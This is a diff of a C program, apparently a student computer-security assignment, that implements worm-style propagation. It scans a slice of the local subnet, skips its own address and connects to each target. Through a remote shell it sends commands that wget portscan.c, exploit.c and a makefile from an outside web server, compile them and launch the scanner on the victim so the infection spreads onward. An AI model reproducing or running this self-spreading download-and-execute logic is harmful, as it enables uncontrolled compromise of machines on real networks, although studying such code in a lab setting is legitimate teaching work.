@@ -65,9 +65,12 @@ int main(int argc, char *argv[]) {
     char *own_ip;
 
     // own_ip = malloc(IP_LENGTH*sizeof(char));
+    ip = malloc(IP_LENGTH*sizeof(char));
 
     own_ip = showips();
-    // printf("%s\n", ip);
+    printf("own_ip: %s\n", own_ip);
+    strcpy(ip, own_ip);
+    printf("ip: %s\n", ip);
     // return(0);
 
     // strcpy(ip, "192.168.1.110");
@@ -76,22 +79,28 @@ int main(int argc, char *argv[]) {
     i = 0;
     subnet = malloc(IP_LENGTH*sizeof(char));
     subnet[0] = '\0';
-    while (((token = strsep(&own_ip, ".")) != NULL) && i<3 ) {        
+    while (((token = strsep(&ip, ".")) != NULL) && i<3 ) {        
         strcat(subnet, token);
         strcat(subnet, ".");
         i++;
     }
-
+    printf("own_ip: %s\n", own_ip);
     ip = malloc(IP_LENGTH*sizeof(char));
     ips = malloc(3*sizeof(char));
-    for (ipaddr=110; ipaddr<=254; ipaddr++) {
-
-        // compare ip with own_ip
+    for (ipaddr=110; ipaddr<=120; ipaddr++) {
 
         strcpy(ip, subnet);
         sprintf(ips, "%d", ipaddr);
         strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
         
+        // check if IP is itself
+        
+        printf("%s\n", ip);
+        if (!strcmp(ip, own_ip)) {
+            printf("Skipping %s\n", ip);
+            continue;
+        }
+
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if(sockfd == -1) {
             printf("ERROR opening socket!\n");
@@ -265,25 +274,25 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[7] = {   
+        char *commands[8] = {   
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
                                 "gcc -c exploit.c\n",
                                 "gcc -c portscan.c\n",
                                 "gcc -o portscan portscan.o exploit.o\n",
-                                // "make\n",
+                                "make\n",
                                 "./portscan\n"
         }; //, "gcc portscan.c -o portscan", "./portscan"};
         // int buffsize[7] = {3, 4, 5, 3, 8};
 
         int i;
-        for(i=0; i<7; i++) {
+        for(i=0; i<8; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
-            sleep(3);
+            sleep(10);
             if(i == 2) {
-                sleep(10);
+                sleep(20);
             }
         }
         
